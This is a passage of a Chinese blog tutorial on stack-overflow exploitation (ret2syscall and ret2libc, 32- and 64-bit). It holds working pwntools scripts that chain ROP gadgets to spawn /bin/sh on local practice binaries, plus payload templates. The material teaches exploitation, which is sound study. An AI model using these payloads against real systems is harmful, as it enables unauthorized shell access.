+<h4 id="ret2syscall-exp-另一种-gadgets"><a href="#ret2syscall-exp-另一种-gadgets" class="headerlink" title="ret2syscall exp(另一种 gadgets)"></a>ret2syscall exp(另一种 gadgets)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">&quot;b *0x08049421&quot;</span>)  <span class="comment"># int_0x80地址 *0x08049421</span></span><br><span class="line">    pause()  <span class="comment"># 暂停程序，等待你在 GDB 里操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span>             </span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh_addr = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(pop_eax_ret) </span><br><span class="line">payload += p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) </span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>当程序中存在可执行的 libc 函数（如 system 等）我们可以选择 ret2libc 进行获取 shell。通常我们会选择寻找 system 函数和&#x2F;bin&#x2F;sh 字符串的地址进行攻击。在这里我们需要注意的问题是：如何在栈当中正确的布置函数和参数的位置。在 32 和 64 位程序调用的过程亦有不同。<strong><font style="color:#DF2A3F;">以下是存在 system 和 binsh 的情况</font></strong></p>
+<h4 id="32-位程序-re2libc"><a href="#32-位程序-re2libc" class="headerlink" title="32 位程序 re2libc"></a>32 位程序 re2libc</h4><hr>
+<p><img src="/HFTTC.github.io/images/pwn/1768929437013-7e63b627-9adc-445f-9c60-3a4e1edc31f0-152881.png" alt="1768929437013-7e63b627-9adc-445f-9c60-3a4e1edc31f0.png" style="max-width: 100%; display: block; margin: 0 auto;">在 32 位程序中，我们要按照调用顺序依次把函数压入栈中，所以我们构造的payload应该是这样的结构与顺序：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">b</span>&#x27;<span class="selector-tag">a</span>&#x27;*<span class="selector-tag">n</span>(栈溢出直到返回地址) + <span class="selector-tag">p32</span>(system函数地址) + <span class="selector-tag">b</span>&#x27;<span class="selector-tag">xxxx</span>&#x27; + <span class="selector-tag">p32</span>(<span class="string">&quot;/bin/sh&quot;</span>字符串地址)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./your_32_pwn_file&quot;</span>)  </span><br><span class="line">offset = <span class="number">100</span>  </span><br><span class="line"><span class="comment"># 2. libc函数/字符串地址（用objdump/ROPgadget查找）</span></span><br><span class="line">system_addr =   <span class="comment"># system函数的PLT地址</span></span><br><span class="line">sh_str_addr =   <span class="comment"># &quot;/bin/sh&quot;字符串的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充字节 → 覆盖返回地址为system地址 → 随便填4字节（system的返回地址占位） → /bin/sh地址（system的参数）</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * offset               <span class="comment"># 填充到返回地址</span></span><br><span class="line">payload += p32(system_addr)           <span class="comment"># 覆盖返回地址，跳转到system函数</span></span><br><span class="line">payload += <span class="string">b&#x27;xxxx&#x27;</span>                    <span class="comment"># 占位（system执行完后的返回地址，随便填即可）</span></span><br><span class="line">payload += p32(sh_str_addr)           <span class="comment"># system的参数：/bin/sh字符串地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据程序输入逻辑选send/sendline（read用send，scanf用sendline）</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="64-位程序-ret2libc"><a href="#64-位程序-ret2libc" class="headerlink" title="64 位程序 ret2libc"></a>64 位程序 ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  </span><br><span class="line">p = process(<span class="string">&quot;./pwn1&quot;</span>) </span><br><span class="line">system_plt =     <span class="comment"># system函数的PLT表地址</span></span><br><span class="line">sh_str =         <span class="comment"># &quot;/bin/sh&quot;字符串的内存地址（可从libc中找或程序自身数据段）      </span></span><br><span class="line">pop_rdi_ret =    <span class="comment"># pop rdi; ret的ROPgadget地址（ROPgadget --binary pwn1 | grep &quot;pop rdi ; ret&quot;）</span></span><br><span class="line">ret =            <span class="comment"># 纯ret指令的gadget地址（用于栈对齐，防止system执行崩溃）</span></span><br><span class="line">offset =         <span class="comment"># 填充到返回地址的偏移量（通过cyclic工具计算）</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset       <span class="comment"># 填充垃圾数据，覆盖到栈上的返回地址位置</span></span><br><span class="line">payload += p64(ret)           <span class="comment"># 栈对齐：64位系统调用函数时需保证栈是16字节对齐</span></span><br><span class="line">payload += p64(pop_rdi_ret)   <span class="comment"># 执行该gadget，将栈下一个值弹出到rdi寄存器（64位传参用）</span></span><br><span class="line">payload += p64(sh_str)        <span class="comment"># 栈上数据，会被pop rdi; ret弹出到rdi（作为system的第一个参数）</span></span><br><span class="line">payload += p64(system_plt)    <span class="comment"># 覆盖返回地址为system的PLT地址，执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a><font style="color:#DF2A3F;">延迟绑定</font></h4><p><strong>当我们在程序中无法寻找到 system 函数和”&#x2F;bin&#x2F;sh”字符串的时候</strong>，我们就需要用到 plt 和 got 表的延迟绑定。</p>
+<blockquote>
+<p>更新: 2026-01-26 17:53:20<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/qeoruymelg66r96p">https://www.yuque.com/idcm/wnemg9/qeoruymelg66r96p</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="pwn小知识库" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%E5%BA%93/" aria-label="前一篇: pwn小知识库" title="前一篇: pwn小知识库"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            pwn小知识库
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="MipsPwn" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/MipsPwn/" aria-label="后一篇: MipsPwn"  title="后一篇: MipsPwn"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          MipsPwn
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2text-ret2syscall-ret2libc"><span class="toc-number">1.</span> <span class="toc-text">ret2text ret2syscall ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">ROP的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFgedget%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是gedget？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.3.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.4.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ropper-%E7%9A%84%E4%BD%BF%E7%94%A8-%E5%AF%BB%E6%89%BE-gadgets"><span class="toc-number">1.4.1.</span> <span class="toc-text">ropper 的使用(寻找 gadgets)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#obdjump-%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%88%E5%AF%BB%E6%89%BE-bin-sh%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">obdjump 的使用（寻找 &#x2F;bin&#x2F;sh）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.3.</span> <span class="toc-text">32位程序的条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">64位程序的条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E4%B8%8D%E5%88%B0pop-rax-ret%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">1.4.5.</span> <span class="toc-text">找不到pop rax; ret怎么办？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2syscall-exp-%E5%8F%A6%E4%B8%80%E7%A7%8D-gadgets"><span class="toc-number">1.4.6.</span> <span class="toc-text">ret2syscall exp(另一种 gadgets)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.5.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32-%E4%BD%8D%E7%A8%8B%E5%BA%8F-re2libc"><span class="toc-number">1.5.1.</span> <span class="toc-text">32 位程序 re2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64-%E4%BD%8D%E7%A8%8B%E5%BA%8F-ret2libc"><span class="toc-number">1.5.2.</span> <span class="toc-text">64 位程序 ret2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">延迟绑定</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "ret2textret2syscallret2libc",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/ret2textret2syscallret2libc/",
+          excerpt: "",
+          description: "",
+          stripContent: "ret2text ret2syscall ret2libcROP的介绍_**Return Oriented Programming（面向返回的编程） **_主要是在栈溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程，绕过 NX 的防御。 什么是gedget？在二进制漏洞利用比如 ROP 攻击中，Gadget（中文常称指令片段）是指以 ret 指令结尾的、长度很短的连续机器指令序列.这些指令片段并不是程序刻意编写的,而是从程序的现有代码段(",
+          date: "Tue Apr 28 2026 19:14:15 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
